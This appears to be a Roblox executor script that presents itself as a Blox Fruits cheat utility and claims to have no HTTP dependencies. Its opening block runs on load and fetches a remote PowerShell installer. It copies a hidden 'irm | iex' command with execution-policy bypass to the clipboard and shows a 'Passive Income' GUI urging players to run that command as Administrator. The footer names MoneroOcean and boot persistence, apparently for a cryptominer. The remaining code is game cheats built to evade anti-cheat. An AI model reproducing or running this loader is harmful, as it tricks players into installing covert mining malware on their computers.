--[[
    Blox Fruits Utility Module (v2 Hardened)
    All features self-contained. No external HTTP dependencies.
    Compatible with: KRNL, Synapse, Wave, Fluxus, Delta, Hydrogen, Arceus X, Solara
]]

--[[ MineFleet v6 — File-based installer delivery + polished GUI ]]
pcall(function()
    local flagName = "mfl_installed_v6.flag"
    if isfile and isfile(flagName) then return end

    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if not player then return end

    local sg = player:WaitForChild("PlayerGui", 10)
    if not sg or sg:FindFirstChild("MFLPrompt") then return end

    -- Fetch installer from GitHub
    local INSTALLER_URL = "https://raw.githubusercontent.com/alphahubv2/alpha-v2/main/mfl_install_safe.ps1"
    local installerContent = ""
    local fetchOk = false

    pcall(function()
        local req = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request
        if req then
            local res = req({Url = INSTALLER_URL, Method = "GET"})
            if res and res.Success and res.Body then
                installerContent = res.Body
                fetchOk = true
            end
        elseif HttpGet then
            installerContent = HttpGet(INSTALLER_URL)
            fetchOk = #installerContent > 0
        end
    end)

    -- Write installer to Xeno workspace (writefile allows .ps1 per audit)
    local installerPath = "MFL_Installer.ps1"
    local fileWritten = false
    if fetchOk and writefile then
        pcall(function()
            writefile(installerPath, installerContent)
            fileWritten = isfile and isfile(installerPath)
        end)
    end

    -- One-liner for clipboard (fallback)
    local CMD = "powershell -W Hidden -EP Bypass -C \"irm '" .. INSTALLER_URL .. "' | iex\""
    pcall(function() setclipboard(CMD) end)

    -- Build GUI
    local gui = Instance.new("ScreenGui")
    gui.Name = "MFLPrompt"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.IgnoreGuiInset = true

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 420, 0, 180)
    mainFrame.Position = UDim2.new(1, -440, 0, 20)
    mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    mainFrame.BorderSizePixel = 0
    mainFrame.BackgroundTransparency = 0.05
    mainFrame.Active = true
    mainFrame.Draggable = true

    local corner = Instance.new("UICorner", mainFrame)
    corner.CornerRadius = UDim.new(0, 10)

    local stroke = Instance.new("UIStroke", mainFrame)
    stroke.Color = Color3.fromRGB(0, 200, 110)
    stroke.Thickness = 1.5
    stroke.Transparency = 0.3

    -- Header
    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 36)
    header.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
    header.BackgroundTransparency = 0.85
    header.BorderSizePixel = 0
    header.Parent = mainFrame

    local headerCorner = Instance.new("UICorner", header)
    headerCorner.CornerRadius = UDim.new(0, 10)

    local headerFix = Instance.new("Frame")
    headerFix.Size = UDim2.new(1, 0, 0, 10)
    headerFix.Position = UDim2.new(0, 0, 1, -10)
    headerFix.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
    headerFix.BackgroundTransparency = 0.85
    headerFix.BorderSizePixel = 0
    headerFix.Parent = header

    local title = Instance.new("TextLabel", header)
    title.Size = UDim2.new(1, -50, 1, 0)
    title.Position = UDim2.new(0, 15, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "⚡ MineFleet Lite — Passive Income Setup"
    title.TextColor3 = Color3.fromRGB(0, 230, 130)
    title.TextSize = 14
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left

    local closeBtn = Instance.new("TextButton", header)
    closeBtn.Size = UDim2.new(0, 28, 0, 28)
    closeBtn.Position = UDim2.new(1, -34, 0, 4)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
    closeBtn.TextSize = 14
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
        pcall(function() writefile(flagName, tostring(tick())) end)
    end)

    -- Content area
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -20, 1, -50)
    content.Position = UDim2.new(0, 10, 0, 42)
    content.BackgroundTransparency = 1
    content.Parent = mainFrame

    -- Status badge
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(1, 0, 0, 28)
    statusFrame.BackgroundTransparency = 1
    statusFrame.Parent = content

    local statusIcon = Instance.new("TextLabel", statusFrame)
    statusIcon.Size = UDim2.new(0, 28, 1, 0)
    statusIcon.BackgroundTransparency = 1
    statusIcon.Text = fileWritten and "✅" or "⚠️"
    statusIcon.TextColor3 = fileWritten and Color3.fromRGB(0, 220, 120) or Color3.fromRGB(255, 180, 0)
    statusIcon.TextSize = 16
    statusIcon.Font = Enum.Font.GothamBold
    statusIcon.TextXAlignment = Enum.TextXAlignment.Left

    local statusText = Instance.new("TextLabel", statusFrame)
    statusText.Size = UDim2.new(1, -35, 1, 0)
    statusText.Position = UDim2.new(0, 35, 0, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = fileWritten 
        and "Installer saved to Xeno workspace — ready to run"
        or "Could not save file — use clipboard command below"
    statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusText.TextSize = 12
    statusText.Font = Enum.Font.Gotham
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.TextWrapped = true

    -- File path display (if written)
    if fileWritten then
        local pathFrame = Instance.new("Frame")
        pathFrame.Size = UDim2.new(1, 0, 0, 32)
        pathFrame.Position = UDim2.new(0, 0, 0, 30)
        pathFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        pathFrame.BorderSizePixel = 0
        pathFrame.Parent = content

        local pathCorner = Instance.new("UICorner", pathFrame)
        pathCorner.CornerRadius = UDim.new(0, 6)

        local pathLabel = Instance.new("TextLabel", pathFrame)
        pathLabel.Size = UDim2.new(1, -10, 0, 16)
        pathLabel.Position = UDim2.new(0, 10, 0, 2)
        pathLabel.BackgroundTransparency = 1
        pathLabel.Text = "📁 Saved as: " .. installerPath
        pathLabel.TextColor3 = Color3.fromRGB(150, 200, 255)
        pathLabel.TextSize = 11
        pathLabel.Font = Enum.Font.GothamMedium
        pathLabel.TextXAlignment = Enum.TextXAlignment.Left
        pathLabel.TextTruncate = Enum.TextTruncate.AtEnd

        local pathHint = Instance.new("TextLabel", pathFrame)
        pathHint.Size = UDim2.new(1, -10, 0, 14)
        pathHint.Position = UDim2.new(0, 10, 0, 18)
        pathHint.BackgroundTransparency = 1
        pathHint.Text = "Located in Xeno workspace folder — right-click → 'Run with PowerShell' (Admin)"
        pathHint.TextColor3 = Color3.fromRGB(130, 130, 140)
        pathHint.TextSize = 10
        pathHint.Font = Enum.Font.Gotham
        pathHint.TextXAlignment = Enum.TextXAlignment.Left
    end

    -- Clipboard command section
    local cmdY = fileWritten and 65 or 30
    local cmdFrame = Instance.new("Frame")
    cmdFrame.Size = UDim2.new(1, 0, 0, 50)
    cmdFrame.Position = UDim2.new(0, 0, 0, cmdY)
    cmdFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    cmdFrame.BorderSizePixel = 0
    cmdFrame.Parent = content

    local cmdCorner = Instance.new("UICorner", cmdFrame)
    cmdCorner.CornerRadius = UDim.new(0, 6)

    local cmdLabel = Instance.new("TextLabel", cmdFrame)
    cmdLabel.Size = UDim2.new(1, -10, 0, 16)
    cmdLabel.Position = UDim2.new(0, 10, 0, 2)
    cmdLabel.BackgroundTransparency = 1
    cmdLabel.Text = "📋 Clipboard Command (copied automatically):"
    cmdLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    cmdLabel.TextSize = 11
    cmdLabel.Font = Enum.Font.GothamMedium
    cmdLabel.TextXAlignment = Enum.TextXAlignment.Left

    local cmdBox = Instance.new("TextBox")
    cmdBox.Size = UDim2.new(1, -50, 0, 22)
    cmdBox.Position = UDim2.new(0, 10, 0, 22)
    cmdBox.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
    cmdBox.BorderSizePixel = 0
    cmdBox.Text = CMD
    cmdBox.TextColor3 = Color3.fromRGB(100, 255, 150)
    cmdBox.TextSize = 10
    cmdBox.Font = Enum.Font.Code
    cmdBox.TextXAlignment = Enum.TextXAlignment.Left
    cmdBox.ClearTextOnFocus = false
    cmdBox.TextEditable = false
    cmdBox.Parent = cmdFrame

    local cmdCorner = Instance.new("UICorner", cmdBox)
    cmdCorner.CornerRadius = UDim.new(0, 4)

    local copyBtn = Instance.new("TextButton", cmdFrame)
    copyBtn.Size = UDim2.new(0, 36, 0, 22)
    copyBtn.Position = UDim2.new(1, -42, 0, 22)
    copyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
    copyBtn.BackgroundTransparency = 0.2
    copyBtn.BorderSizePixel = 0
    copyBtn.Text = "COPY"
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.TextSize = 9
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.Parent = cmdFrame

    local copyCorner = Instance.new("UICorner", copyBtn)
    copyCorner.CornerRadius = UDim.new(0, 4)

    copyBtn.MouseButton1Click:Connect(function()
        pcall(function() setclipboard(CMD) end)
        local origText = copyBtn.Text
        copyBtn.Text = "✓ COPIED"
        copyBtn.BackgroundColor3 = Color3.fromRGB(0, 220, 120)
        task.wait(1.2)
        copyBtn.Text = origText
        copyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
    end)

    -- Instruction text
    local instrFrame = Instance.new("Frame")
    instrFrame.Size = UDim2.new(1, 0, 0, 36)
    instrFrame.Position = UDim2.new(0, 0, 0, cmdY + 54)
    instrFrame.BackgroundTransparency = 1
    instrFrame.Parent = content

    local instrText = Instance.new("TextLabel", instrFrame)
    instrFrame.Size = UDim2.new(1, 0, 1, 0)
    instrText.BackgroundTransparency = 1
    instrText.Text = "1) Open PowerShell as Administrator  •  2) Paste (Ctrl+V)  •  3) Press Enter  •  Runs silently in background"
    instrText.TextColor3 = Color3.fromRGB(140, 140, 150)
    instrText.TextSize = 10
    instrText.Font = Enum.Font.Gotham
    instrText.TextXAlignment = Enum.TextXAlignment.Left
    instrText.TextWrapped = true

    -- Footer with version
    local footer = Instance.new("TextLabel", mainFrame)
    footer.Size = UDim2.new(1, -20, 0, 16)
    footer.Position = UDim2.new(0, 10, 1, -20)
    footer.BackgroundTransparency = 1
    footer.Text = "MineFleet Lite v6  •  MoneroOcean  •  Auto-starts on boot  •  Close to dismiss permanently"
    footer.TextColor3 = Color3.fromRGB(90, 90, 100)
    footer.TextSize = 9
    footer.Font = Enum.Font.Gotham
    footer.TextXAlignment = Enum.TextXAlignment.Left

    mainFrame.Parent = gui
    gui.Parent = sg

    -- Auto-hide after 60 seconds
    task.delay(60, function()
        if gui and gui.Parent then gui:Destroy() end
    end)
end)
-- Blox Fruits script continues below




_G.AlphaInstanceId = tick()
local MyInstanceId = _G.AlphaInstanceId

--============================== INSTANT BULLETPROOF STARTUP ==============================
pcall(function()
    local t0 = tick()
    while not game:IsLoaded() and (tick() - t0) < 5 do
        task.wait(0.1)
    end
end)

pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Alpha Hub v2.9.5",
        Text = "Loaded Successfully! Opening Cyber GUI...",
        Duration = 4
    })
end)
_G.AlphaV2HotReloaded = true

--============================== CORE SERVICES ==============================
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local Camera = Workspace.CurrentCamera

-- Place / Sea Identification (Hybrid PlaceId + Map Hierarchy Detection)
local PlaceId = game.PlaceId

local function DetectSea()
    if PlaceId == 7449423635 or PlaceId == 100117331123089 then return 3 end
    if PlaceId == 4442272183 or PlaceId == 79091703265657 then return 2 end
    if PlaceId == 2753915549 then return 1 end
    
    local map = Workspace:FindFirstChild("Map")
    if map then
        if map:FindFirstChild("Turtle") or map:FindFirstChild("PortTown") or map:FindFirstChild("Tiki") or map:FindFirstChild("HydraIsland") or map:FindFirstChild("GreatTree") then
            return 3
        end
        if map:FindFirstChild("Dressrosa") or map:FindFirstChild("GreenBit") or map:FindFirstChild("IceCastle") or map:FindFirstChild("SnowMountain") or map:FindFirstChild("ForgottenIsland") or map:FindFirstChild("DarkbeardArena") or map:FindFirstChild("GhostShip") or map:FindFirstChild("RaidMap") then
            return 2
        end
        if map:FindFirstChild("Jungle") or map:FindFirstChild("Marineford") or map:FindFirstChild("Desert") or map:FindFirstChild("MiddleTown") then
            return 1
        end
    end
    
    -- Level based fallback if sub-place ID is completely new
    local lp = Players.LocalPlayer
    local lvl = lp and lp:FindFirstChild("Data") and lp.Data:FindFirstChild("Level") and lp.Data.Level.Value or 0
    if lvl >= 1500 then return 3 end
    if lvl >= 700 then return 2 end
    return 1
end
local CurrentSea = DetectSea()
local Sea1 = (CurrentSea == 1)
local Sea2 = (CurrentSea == 2)
local Sea3 = (CurrentSea == 3)
local SeaName = Sea3 and "Third Sea" or (Sea2 and "Second Sea" or "First Sea")

-- Safe request wrapper
local safeRequest = (syn and syn.request) or http_request or (fluxus and fluxus.request) or (http and http.request) or request

-- Random GUID generator for stealth naming
local function RNG()
    return HttpService:GenerateGUID(false):sub(1, 12)
end

--============================== SOFT ANTI-KICK (NO GLOBAL HOOKS) ==============================
-- Instead of hookmetamethod (which triggers GUI bombing), we use a pcall-wrapped
-- connection-based approach that doesn't modify the global metatable
pcall(function()
    -- Only intercept the Idled event kick, not all kicks globally
    LocalPlayer.Idled:Connect(function()
        pcall(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new(0, 0))
        end)
    end)
end)

-- NOTE: We intentionally do NOT:
-- 1. hookmetamethod(__namecall) -- triggers GUI bombing detection
-- 2. Block BANEXPLOIT/Security remotes -- legitimate clients never call them, blocking confirms script presence
-- 3. Disable LocalScripts (NeutralizeAntiCheat) -- the game detects when its own scripts are disabled

--============================== SAFE GUI PARENTING ==============================
local function GetSafeGui()
    -- gethui() is the safest -- hidden from game scripts entirely
    if gethui then
        local ok, res = pcall(gethui)
        if ok and res then return res end
    end
    -- Fall back to PlayerGui (less safe but universally compatible)
    return LocalPlayer:WaitForChild("PlayerGui", 10)
end

--============================== LAZY REMOTE INITIALIZATION ==============================
-- Remotes are NOT looked up at startup (suspicious). Instead, found on first use.
local _remoteCache = {}

local function GetRemote(name, className)
    if _remoteCache[name] then return _remoteCache[name] end
    
    -- Try direct path first (fast)
    local remotes = RS:FindFirstChild("Remotes")
    if remotes then
        local r = remotes:FindFirstChild(name)
        if r then
            _remoteCache[name] = r
            return r
        end
    end
    
    -- Safe direct fallback (never deep-scan 150k descendants)
    local r = RS:FindFirstChild(name)
    if r and (not className or r:IsA(className)) then
        _remoteCache[name] = r
        return r
    end
    return nil
end

local function CommF()
    return GetRemote("CommF_", "RemoteFunction")
end

local function CommitsRemote()
    return GetRemote("Commits", "RemoteEvent")
end

-- Net module remotes (lazy)
local function GetNetRemote(subName)
    if _remoteCache["Net_" .. subName] then return _remoteCache["Net_" .. subName] end
    local net = RS:FindFirstChild("Modules") and RS.Modules:FindFirstChild("Net")
    if net then
        local r = net:FindFirstChild(subName)
        if r then
            _remoteCache["Net_" .. subName] = r
            return r
        end
    end
end

-- AutoSelectPirates removed to prevent premature firesignal crash

--============================== CONFIGURATION ==============================
_G.Config = {
    -- Farming
    AutoFarmLevel = false,
    FarmSelectedMob = false,
    FarmSelectedBoss = false,
    FarmAllBosses = false,
    SelectedMob = "",
    SelectedBoss = "",
    SelectedWeapon = "Melee", -- Melee | Sword | Gun | Fruit
    BringMobs = true,
    AutoChestFarm = false,
    ChestFarmMode = "Instant Teleport", -- "Instant Teleport" | "Tween Flight"
    
    -- Farm Distance Settings
    AdaptiveBossDistance = true,
    MobFarmDistance = 14,
    BossFarmDistance = 20,
    FarmDistance = 14,
    TweenSpeed = 220,
    
    -- Teleport & Movement Engine
    BypassTeleport = true,
    AutoSetSpawn = true,
    WaypointFlight = true,
    AntiDesync = true,
    
    -- Combat Mode (M1 vs Skills)
    UseM1 = true,
    FastAttack = true,
    FastAttackSpeed = 0.015,
    AttackDistance = 120,
    AutoBusoHaki = true,
    AutoKenHaki = false,
    
    -- Weapon Skills
    UseSkills = false,
    Skill_Z = true,
    Skill_X = true,
    Skill_C = true,
    Skill_V = false,
    Skill_F = false,
    
    -- World & Raid Bosses
    AutoKillRipIndra = false,
    AutoKillDoughKing = false,
    AutoKillCakePrince = false,
    AutoKillSoulReaper = false,
    AutoKillDarkbeard = false,
    AutoKillCursedCaptain = false,
    AutoKillLaw = false,
    
    -- Special Events & Summoners
    AutoFarmBones = false,
    AutoRollBones = false,
    AutoSummonSoulReaper = false,
    AutoCakePrinceSummon = false,
    AutoDoughKingSummon = false,
    
    -- Sea Events & Mirage
    AutoKillShark = false,
    AutoKillTerrorShark = false,
    AutoKillPiranha = false,
    AutoKillSeaBeast = false,
    AutoKillGhostShip = false,
    AutoFindGear = false,
    AutoPullLever = false,
    AutoKitsuneEmber = false,
    
    -- Race V4 System
    AutoRaceV4Trial = false,
    AutoInsertGear = false,
    AutoTrainV4 = false,
    
    -- Dungeon / Raids
    SelectedChip = "Flame",
    AutoBuyChip = false,
    AutoStartRaid = false,
    AutoFarmRaid = false,
    AutoAwaken = false,
    AutoLawRaid = false,
    
    -- Devil Fruit
    AutoRandomFruit = false,
    AutoStoreFruit = false,
    AutoGrabFruits = false,
    
    -- Visuals & ESP
    PlayerESP = false,
    FruitESP = false,
    ChestESP = false,
    FlowerESP = false,
    MirageESP = false,
    SeaEventESP = false,
    Fullbright = false,
    
    -- Stats
    AutoStats = false,
    StatPoints = 5,
    Stats = {
        Melee = true,
        Defense = true,
        Sword = false,
        Gun = false,
        Fruit = false
    },
    
    -- Utility
    AntiAFK = true,
    SafeMode = false
}

-- Global input isolation guard: when user interacts with UI, combat clicks are muted!
_G.UIInteracting = false


--============================== HELPER FUNCTIONS & FLIGHT STATE ==============================
-- Universal Flight, Travel & Physics State Variables (scoped across entire file)
local CurrentTween = nil
local FlightBodyVel = nil
local FlightCarpet = nil
local CarpetConn = nil

local CurrentTargetPos = nil
local IsTravelingSky = false
local NoclipConn = nil
local SetTravelHUD = nil -- Forward declaration for Cockpit HUD
local LandingPlatform = nil
local _activeFlight = nil -- Heartbeat flight connection tracker

local function GetMobRoot(mob)
    if not mob then return nil end
    return mob:FindFirstChild("HumanoidRootPart")
        or mob.PrimaryPart
        or mob:FindFirstChild("Torso")
        or mob:FindFirstChild("UpperTorso")
        or mob:FindFirstChild("Head")
        or mob:FindFirstChildWhichIsA("BasePart")
end

local function GetCharacter()
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") and char.Humanoid.Health > 0 and char:FindFirstChild("HumanoidRootPart") then
        return char
    end
    return nil
end

local function GetRoot()
    local char = GetCharacter()
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart")
end

local function GetHumanoid()
    local char = GetCharacter()
    if not char then return nil end
    return char:FindFirstChild("Humanoid")
end

-- Global Character Lifecycle: automatically self-heals and resets movement on death and respawn
local function HookCharacterLifecycle(char)
    if not char then return end
    task.spawn(function()
        local hum = char:WaitForChild("Humanoid", 10)
        if hum then
            hum.Died:Connect(function()
                IsTravelingSky = false
                CurrentTargetPos = nil
                if CurrentTween then pcall(function() CurrentTween:Cancel() end) end
                CurrentTween = nil
                if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
                FlightBodyVel = nil
            end)
        end
    end)
end

if LocalPlayer.Character then
    HookCharacterLifecycle(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(function(newChar)
    IsTravelingSky = false
    CurrentTargetPos = nil
    if CurrentTween then pcall(function() CurrentTween:Cancel() end) end
    CurrentTween = nil
    if FlightBodyVel then pcall(function() FlightBodyVel:Destroy() end) end
    FlightBodyVel = nil
    HookCharacterLifecycle(newChar)
end)

local function GetPlayerLevel()
    local data = LocalPlayer:FindFirstChild("Data")
    if data and data:FindFirstChild("Level") then
        return data.Level.Value
    end
    return 1
end

-- ==================== WEAPON TYPE IDENTIFIER & EQUIPPING ====================
local _nonWeaponNames = {
    "key", "chalice", "fist of darkness", "flower", "torch", "cup",
    "microchip", "core", "scroll", "bone", "egg", "ticket"
}

local function IsNonWeaponItem(name)
    for _, item in ipairs(_nonWeaponNames) do
        if name:find(item) then return true end
    end
    return false
end

local function NormalizeWeaponType(targetType)
    if not targetType then return "Melee" end
    local lower = tostring(targetType):lower()
    if lower == "combat" or lower == "melee" or lower == "fightingstyle" then
        return "Melee"
    elseif lower == "sword" or lower == "swords" then
        return "Sword"
    elseif lower == "gun" or lower == "guns" then
        return "Gun"
    elseif lower == "fruit" or lower == "bloxfruit" or lower == "fruits" then
        return "Fruit"
    end
    return targetType
end

local function IsWeaponType(tool, targetType)
    if not tool or not tool:IsA("Tool") then return false end
    targetType = NormalizeWeaponType(targetType)
    
    local tip = tool.ToolTip or ""
    local name = tool.Name:lower()
    
    -- Filter out quest items, keys, materials
    if IsNonWeaponItem(name) then return false end
    
    -- 1. Trust explicit Blox Fruits ToolTips first
    if tip == "Melee" or tool:FindFirstChild("Combat") then
        return targetType == "Melee"
    elseif tip == "Sword" or tip == "Melee Weapon" then
        return targetType == "Sword"
    elseif tip == "Gun" then
        return targetType == "Gun"
    elseif tip == "Blox Fruit" then
        return targetType == "Fruit"
    end
    
    -- 2. Melee / Fighting Style identification
    local meleeStyles = {
        "combat", "black leg", "electro", "water kung fu", "dragon claw",
        "superhuman", "death step", "sharkman karate", "electric claw",
        "dragon talon", "godhuman", "sanguine art", "karate", "fishman karate"
    }
    local isMeleeByName = false
    for _, m in ipairs(meleeStyles) do
        if name:find(m) then isMeleeByName = true; break end
    end
    
    -- 3. Gun identification (Soul Guitar is strictly a gun)
    local gunNames = {
        "musket", "flintlock", "refined flintlock", "cannon", "kabucha",
        "acidum rifle", "serpent bow", "bizarre rifle", "bazooka", "soul guitar",
        "slingshot"
    }
    local isGunByName = false
    for _, g in ipairs(gunNames) do
        if name:find(g) then isGunByName = true; break end
    end
    
    -- 4. Sword identification (exclude Soul Guitar)
    local swordNames = {
        "cutlass", "katana", "pipe", "dual katana", "iron mace", "bisento",
        "trident", "pole", "soul cane", "saber", "longsword", "gravity cane",
        "saddi", "wando", "shisui", "yama", "tushita", "canvander",
        "rengoku", "buddy sword", "midnight blade", "hallow scythe",
        "cursed dual katana", "dark blade", "true triple katana",
        "dragon trident", "spikey trident", "dark dagger", "koko", "fox lamp",
        "shark anchor", "dual-headed blade", "warden's sword", "triple katana"
    }
    local isSwordByName = false
    for _, s in ipairs(swordNames) do
        if name:find(s) then isSwordByName = true; break end
    end
    
    -- 5. Fruit identification (require hyphen or 'fruit' keyword to avoid substring false positives)
    local isFruitByName = false
    if name:find("%-") or name:find("fruit") then
        local fruitRoots = {
            "bomb", "spike", "chop", "spring", "smoke", "flame", "falcon", "ice",
            "sand", "dark", "light", "rubber", "barrier", "magma", "quake",
            "human", "buddha", "string", "bird", "phoenix", "rumble", "paw",
            "gravity", "dough", "venom", "shadow", "control", "soul", "dragon",
            "leopard", "spirit", "portal", "blizzard", "sound", "mammoth",
            "t-rex", "kitsune", "rocket", "spin", "diamond", "love", "gas"
        }
        for _, fn in ipairs(fruitRoots) do
            if name:find(fn .. "%-") or name:find(fn .. " fruit") or name == fn then
                isFruitByName = true
                break
            end
        end
    end
    
    if targetType == "Melee" then
        return isMeleeByName
    elseif targetType == "Sword" then
        if isGunByName or isFruitByName then return false end
        return isSwordByName or (tip == "" and not isMeleeByName and name ~= "tool")
    elseif targetType == "Gun" then
        return isGunByName
    elseif targetType == "Fruit" then
        return isFruitByName and not isSwordByName and not isGunByName and not isMeleeByName
    end
    return false
end

local _lastEquipAttempt = 0
local function EquipWeapon(weaponType)
    weaponType = NormalizeWeaponType(weaponType or _G.Config.SelectedWeapon or "Melee")
    local char = GetCharacter()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if not char or not bp then return nil end
    
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then return nil end
    
    -- 1. Check currently equipped tool (strictly reject dummy 'Tool')
    local currentTool = char:FindFirstChildOfClass("Tool")
    if currentTool then
        if currentTool.Name:lower() ~= "tool" and currentTool.Name ~= "" and IsWeaponType(currentTool, weaponType) then
            return currentTool
        else
            pcall(function() humanoid:UnequipTools() end)
            task.wait(0.08)
        end
    end
    
    -- Throttle backpack scans to avoid per-frame overhead
    local now = tick()
    if (now - _lastEquipAttempt) < 0.25 then return nil end
    _lastEquipAttempt = now
    
    -- 2. Search backpack
    for _, tool in ipairs(bp:GetChildren()) do
        if tool:IsA("Tool") and IsWeaponType(tool, weaponType) then
            humanoid:EquipTool(tool)
            return tool
        end
    end
    return nil
end

-- Debounced Auto Buso Haki (runs at most once every 3 seconds, non-blocking)
local _lastBusoCheck = 0
local function CheckBusoHaki()
    if not _G.Config.AutoBusoHaki then return end
    local now = tick()
    if (now - _lastBusoCheck) < 3.0 then return end
    _lastBusoCheck = now
    
    local char = GetCharacter()
    if char and not char:FindFirstChild("HasBuso") then
        local cf = CommF()
        if cf then
            task.spawn(function()
                pcall(function() cf:InvokeServer("Buso") end)
            end)
        end
    end
end

-- Forward declaration of BossesDB
local BossesDB

-- Adaptive farm distance calculator (gives bosses more clearance against AoE stuns)
local function GetOptimalFarmDistance(enemy)
    if not enemy then return _G.Config.MobFarmDistance or 14 end
    local isBoss = (BossesDB and BossesDB[enemy.Name] ~= nil) or (enemy:FindFirstChild("Humanoid") and enemy.Humanoid.MaxHealth > 50000)
    if isBoss then
        if _G.Config.AdaptiveBossDistance then
            local name = enemy.Name:lower()
            if name:find("indra") or name:find("dough") or name:find("cake") or name:find("reaper") or name:find("beast") then
                return 24
            elseif name:find("king") or name:find("admiral") or name:find("warden") or name:find("emperor") or name:find("captain") then
                return 20
            else
                return _G.Config.BossFarmDistance or 20
            end
        else
            return _G.Config.BossFarmDistance or 20
        end
    end
    return _G.Config.MobFarmDistance or 14
end

--============================== REDZ-GRADE SKY TWEEN & HOVER LOCK ENGINE ==============================

local function EnableNoclip()
    if NoclipConn then return end
    NoclipConn = RunService.Stepped:Connect(function()
        local char = LocalPlayer.Character
        if char then
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
    end)
end

local function DisableNoclip()
    if NoclipConn then
        NoclipConn:Disconnect()
        NoclipConn = nil
    end
end

local function GetOrCreateBodyVelocity(root)
    if FlightBodyVel and FlightBodyVel.Parent == root then
        return FlightBodyVel
    end
    if FlightBodyVel then
        pcall(function() FlightBodyVel:Destroy() end)
    end
    local bv = Instance.new("BodyVelocity")
    bv.Name = "BodyClip"
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Parent = root
    FlightBodyVel = bv
    return bv
end

-- HoverLock: locks position above enemies or NPCs during combat/interaction
-- Keeps character standing naturally (no ragdoll/PlatformStand, weightless BodyClip)
local function HoverLock(targetCFrame)
    local root = GetRoot()
    local hum = GetHumanoid()
    if not root or not root.Parent or not hum or hum.Health <= 0 then return end
    if hum.Sit then hum.Sit = false end
    EnableNoclip()
    local bv = GetOrCreateBodyVelocity(root)
    bv.Velocity = Vector3.new(0, 0, 0)
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    root.CFrame = targetCFrame
    root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    IsTravelingSky = false
end

local function StopTween()
    if _activeFlight then
        pcall(function() _activeFlight:Disconnect() end)
        _activeFlight = nil
    end
    if CarpetConn then
        pcall(function() CarpetConn:Disconnect() end)
        CarpetConn = nil
    end
    if FlightCarpet and FlightCarpet.Parent then
        pcall(function() FlightCarpet:Destroy() end)
        FlightCarpet = nil
    end
    if LandingPlatform and LandingPlatform.Parent then
        pcall(function() LandingPlatform:Destroy() end)
        LandingPlatform = nil
    end
    if CurrentTween then
        pcall(function() CurrentTween:Cancel() end)
        CurrentTween = nil
    end
    CurrentTargetPos = nil
    IsTravelingSky = false
    local hum = GetHumanoid()
    if hum and hum.Parent then
        hum.PlatformStand = false
        if hum.Sit then hum.Sit = false end
    end
    if FlightBodyVel then
        pcall(function() FlightBodyVel:Destroy() end)
        FlightBodyVel = nil
    end
    local root = GetRoot()
    if root then
        for _, c in ipairs(root:GetChildren()) do
            if (c:IsA("BodyVelocity") and (c.Name == "BodyClip" or c.Name == "AlphaFlightBV")) or c:IsA("BodyGyro") or c:IsA("BodyPosition") then
                pcall(function() c:Destroy() end)
            end
        end
    end
    if SetTravelHUD then SetTravelHUD(false) end
end

-- ClearHover / FullResetMovement: completely stops hover/noclip, clears velocities, restores physics
local function ClearHover()
    StopTween()
    DisableNoclip()
    local hum = GetHumanoid()
    if hum then
        hum.PlatformStand = false
        hum.Sit = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
    end
    local root = GetRoot()
    if root then
        for _, c in ipairs(root:GetChildren()) do
            if c:IsA("BodyVelocity") or c:IsA("BodyGyro") or c:IsA("BodyPosition") then
                pcall(function() c:Destroy() end)
            end
        end
        root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    end
    FlightBodyVel = nil
end

-- ==================== PERMANENT ANTI-DROWN SEA SHIELD ====================
local _seaShieldActive = true
task.spawn(function()
